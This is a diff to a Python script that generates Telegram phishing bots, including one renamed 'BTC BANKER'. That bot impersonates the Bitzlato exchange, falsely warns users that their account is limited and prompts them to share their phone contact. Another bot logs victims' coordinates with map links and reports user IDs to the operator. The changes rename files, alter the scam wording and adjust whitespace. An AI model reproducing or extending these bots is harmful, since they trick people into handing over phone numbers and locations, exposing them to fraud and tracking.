@@ -132,7 +132,7 @@ def contact(message):
 		├ID: {{message.chat.id}}
 		├Longitude: {{lon}}
 		├Latitude: {{lat}}
-		└Map: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
@@ -280,11 +280,9 @@ def entr(message):
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-
-
-
-
 bot.polling()
+
+
         """)
         f.close()
         print("The probiv2.py file is saved")
@@ -489,12 +487,9 @@ def entr1(message):
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
-
-
-
-	
-
 bot.polling()
+
+
         """)
         f.close()
         print("The brawl_stars.py file is saved")
@@ -597,9 +592,9 @@ bot.polling()
         f.close()
         print("The acquaintance.py file is saved")
 
- elif choice == 5:
-        # Code for choice 5 (Acquaintance)
-        f = open('acquaintance1.py', 'w+', encoding='utf-8')
+    elif choice == 5:
+        # Code for choice 5 (BTC BANKER)
+        f = open('btc_banker.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 from telebot import types
@@ -644,13 +639,13 @@ def start(message):
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Warning >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 		
 		except Exception as e:
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Warning >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 			userid = message.chat.id
 			bot.send_message(ID, f'User with ID:{{userid}} launched a bot!')
 
@@ -682,7 +677,7 @@ def contact(message):
 bot.polling()
         """)
         f.close()
-        print("The acquaintance1.py file is saved")
+        print("The btc_banker.py file is saved")
 
     else:
         print('Invalid choice')
